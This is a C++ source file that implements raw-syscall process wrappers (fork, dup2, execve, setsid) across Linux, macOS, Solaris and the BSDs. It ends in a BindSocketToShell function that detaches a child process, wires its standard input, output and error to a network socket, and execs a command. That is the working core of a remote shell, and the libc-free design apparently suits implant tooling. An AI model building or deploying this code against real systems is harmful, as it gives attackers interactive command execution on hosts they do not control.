/**
 * @file process.cc
 * @brief Shared POSIX process management implementation
 *
 * @details Unified fork/exec/dup2/setsid implementation for Linux, macOS,
 * FreeBSD, and Solaris. Platform differences:
 * - Linux aarch64/riscv: clone(SIGCHLD) for fork, dup3 for dup2
 * - Solaris: SYS_forksys for fork, fcntl(F_DUP2FD) for dup2,
 *   SYS_pgrpsys for setsid
 * - macOS/FreeBSD: standard POSIX syscalls
 */

#include "platform/system/process.h"
#if defined(PLATFORM_LINUX)
#include "platform/common/linux/syscall.h"
#include "platform/common/linux/system.h"
#elif defined(PLATFORM_MACOS)
#include "platform/common/macos/syscall.h"
#include "platform/common/macos/system.h"
#elif defined(PLATFORM_SOLARIS)
#include "platform/common/solaris/syscall.h"
#include "platform/common/solaris/system.h"
#elif defined(PLATFORM_FREEBSD)
#include "platform/common/freebsd/syscall.h"
#include "platform/common/freebsd/system.h"
#elif defined(PLATFORM_OPENBSD)
#include "platform/common/openbsd/syscall.h"
#include "platform/common/openbsd/system.h"
#endif

// ============================================================================
// Process syscall wrappers
// ============================================================================

// Fork syscall wrapper
Result<SSIZE, Error> Process::Fork() noexcept
{
#if defined(PLATFORM_LINUX) && (defined(ARCHITECTURE_AARCH64) || defined(ARCHITECTURE_RISCV64) || defined(ARCHITECTURE_RISCV32))
	// aarch64/riscv uses clone with SIGCHLD flag for fork-like behavior
	constexpr USIZE SIGCHLD = 17;
	SSIZE result = System::Call(SYS_CLONE, SIGCHLD, 0, 0, 0, 0);
#elif defined(PLATFORM_SOLARIS)
	// Solaris uses SYS_forksys (142) with subcode 0 for fork
	SSIZE result = System::Call(SYS_FORKSYS, FORKSYS_FORK, 0);
#else
	SSIZE result = System::Call(SYS_FORK);
#endif
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ForkFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Dup2 syscall wrapper
Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
#if defined(PLATFORM_LINUX) && (defined(ARCHITECTURE_AARCH64) || defined(ARCHITECTURE_RISCV64) || defined(ARCHITECTURE_RISCV32))
	// aarch64/riscv uses dup3 with flags=0 instead of dup2
	SSIZE result = System::Call(SYS_DUP3, (USIZE)oldfd, (USIZE)newfd, 0);
#elif defined(PLATFORM_SOLARIS)
	// Solaris has no SYS_dup2 — use fcntl(oldfd, F_DUP2FD, newfd) instead
	SSIZE result = System::Call(SYS_FCNTL, (USIZE)oldfd, (USIZE)F_DUP2FD, (USIZE)newfd);
#else
	SSIZE result = System::Call(SYS_DUP2, (USIZE)oldfd, (USIZE)newfd);
#endif
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_Dup2Failed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Execve syscall wrapper
Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
	SSIZE result = System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ExecveFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Setsid syscall wrapper
Result<SSIZE, Error> Process::Setsid() noexcept
{
#if defined(PLATFORM_SOLARIS)
	// Solaris uses SYS_pgrpsys (39) with subcode 3 for setsid
	SSIZE result = System::Call(SYS_PGRPSYS, PGRPSYS_SETSID);
#else
	SSIZE result = System::Call(SYS_SETSID);
#endif
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_SetsidFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// ============================================================================
// BindSocketToShell
// ============================================================================

// BindSocketToShell - Main function to bind a socket to a shell process
Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
	if (socketFd < 0 || cmd == nullptr)
	{
		return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);
	}

	auto forkResult = Fork();

	if (forkResult.IsErr())
	{
		// Fork failed
		return Result<SSIZE, Error>::Err(forkResult, Error::Process_BindShellFailed);
	}

	auto& pid = forkResult.Value();

	if (pid == 0)
	{
		// Child process

		// Create new session (detach from controlling terminal)
		(void)Setsid();

		// Redirect stdin/stdout/stderr to socket
		if (Dup2(socketFd, STDIN_FILENO).IsErr() ||
			Dup2(socketFd, STDOUT_FILENO).IsErr() ||
			Dup2(socketFd, STDERR_FILENO).IsErr())
		{
			System::Call(SYS_EXIT, 1);
		}

		// Close original socket fd if it's not one of the standard fds
		if (socketFd > STDERR_FILENO)
		{
			System::Call(SYS_CLOSE, (USIZE)socketFd);
		}

		// Build argv/envp as USIZE arrays to pass through System::Call
		// directly, avoiding const_cast (execve does not modify these)
		USIZE argv[2];
		argv[0] = (USIZE)cmd;
		argv[1] = 0;

		USIZE envp[1];
		envp[0] = 0;

		// Execute the command - this should not return
		System::Call(SYS_EXECVE, (USIZE)cmd, (USIZE)argv, (USIZE)envp);

		// If execve returns, something went wrong - exit child
		System::Call(SYS_EXIT, 1);
	}

	// Parent process - return child PID
	return Result<SSIZE, Error>::Ok(pid);
}
